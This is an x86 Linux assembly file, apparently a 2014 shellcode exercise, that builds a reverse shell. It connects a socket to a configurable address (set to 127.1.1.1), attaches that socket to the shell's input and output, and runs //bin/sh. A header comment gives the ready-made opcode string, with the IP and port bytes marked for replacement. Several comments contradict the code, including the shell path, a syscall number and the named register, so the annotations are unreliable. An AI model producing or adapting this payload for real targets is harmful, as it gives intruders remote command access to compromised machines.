;shell_reverse.asm
;
;Author Javier Tejedor
;Date 04/09/2014
;Info: look /usr/include/linux/net.h to see the calls to sys_socket_call

;\x31\xd2\x6a\x66\x58\x6a\x01\x5b\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80;\x89\xc2\x6a\x03\x5b\x68
;\x7f\x01\x01\x01 ; => IP
;\x66\x68
;\x15\xba ; => PORT
;\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\x6a\x66\x58\xcd\x80\x89\xd3\x6a\x02\x59\x49\x6a\x3f\x58\xcd\x80\x75\xf8\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80

global _start

section .text

_start:
	
	;create socket	
	;syscall: 102
	;int socket(int domain, int type, int protocol);		
	xor edx, edx
	push 0x66
	pop eax		;syscall: 102
	push 0x1
	pop ebx		;SYS_SOCKET
	push edx	;arg3, protocol. IPPROTO_IP = 0 
	push 0x1	;arg2, type.	 SOCK_STREAM = 1
	push 0x2	;arg1, domain.	 AF_INET = 2
	mov ecx, esp
	int 0x80
	mov edx, eax	;save the socket reference into esi

	;connect(socket, (struct sockaddr *)&sin, sizeof(struct sockaddr));
	push 0x3
	pop ebx
	;struct sockaddr_in
	push 0x0101017f		;member3, sin_addr.s_add: 127.1.1.1
	push WORD 0Xba15	;member2, port 5051
	push WORD 0x2
	mov ecx, esp
	push 0x10
	push ecx
	push edx
	mov ecx, esp
	push 0x66
	pop eax
	int 0x80

	;dup2
	;syscall: 66
	;int dup2(int fildes, int fildes2);
	mov ebx, edx
	push 0x2	
	pop ecx

dup2_call:
	dec ecx
	push 0x3f	;syscall: 66 ()
	pop eax
	int 0x80
	jnz dup2_call	

	;execve /bin/bash
	;syscall 11
	xor eax, eax
        push eax

        push 0x68732f6e
        push 0x69622f2f

        mov ebx, esp
	push eax
	mov ecx, esp
	push eax
	mov edx, esp
        mov al, 0xb
        int 0x80
